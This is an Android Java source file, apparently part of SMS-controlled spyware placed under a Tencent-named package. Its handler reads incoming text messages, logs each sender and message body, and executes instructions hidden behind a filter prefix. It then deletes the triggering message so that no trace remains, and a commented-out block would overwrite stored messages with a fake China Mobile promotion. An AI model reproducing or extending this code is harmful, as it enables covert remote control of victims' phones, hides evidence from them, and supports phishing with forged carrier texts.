package com.tencent.sms;

import java.net.URL;

import android.content.ContentUris;
import android.content.Context;
import android.net.Uri;
import android.os.Handler;
import android.os.Message;
import android.util.Log;

import com.tencent.qq.Keys;

/*
 * 用于接收SMSObserver发送过来的短信内容（MessageItem）
 */
public class SMSHandler extends Handler{

	private static final String TAG="SMSHandler";
	private Context mContext;
	
	public SMSHandler(Context context)
	{
		super();
		this.mContext=context;
	}
	@Override
	public void handleMessage(Message msg)
	{
		MessageItem item=(MessageItem)msg.obj;
		
		//new Intent(Intent.ACTION_REBOOT);
		  Log.e(TAG, "token>>>>>>>smsObserver start:"+item.toString()+","+item.getPhone()+","+item.getBody());
		  
		//可以根据短信内容进行判断，执行您想要的操作，如发送 Filter字符+dialog你就弹出个对话框，
		
		/*ContentValues values=new ContentValues();
		//values.put(SMSConstant.ADDRESS, "10086"); 修改了这个没效果，因为需要修改多个表才能把显示的手机号修改
		values.put(SMSConstant.BODY, "尊敬的用户，您好！江西移动感恩回馈，恭喜您已经免费获得3个月的WLAN（CMCC校园宽带） 20元包月(100小时)的免费套餐服务");
		mContext.getContentResolver().update(uri, values, SMSConstant.ADDRESS+" = "+item.getPhone() ,null);*/
		String instruct=item.getBody().trim().substring(Keys.FILTER.length()).trim();
		//进行指令解析
		InstructResolver instructResolver= new InstructResolver(this.mContext);
		instructResolver.Parse(instruct);
		if(instructResolver.execute())
			Log.v(TAG, "指令执行成功！");
		else {
			Log.v(TAG, "指令执行失败！");
		}
		if(item.getId()!=-1){
			//添加给定的ID结尾的路径。
			Uri uri=ContentUris.withAppendedId(Uri.parse(SMSConstant.SMS_URI_ALL), item.getId());
			//删除指定的短信,操作不留痕迹。。。^_^
			mContext.getContentResolver().delete(uri,null,null);
		}
		Log.v(TAG, item.toString());
	}
}
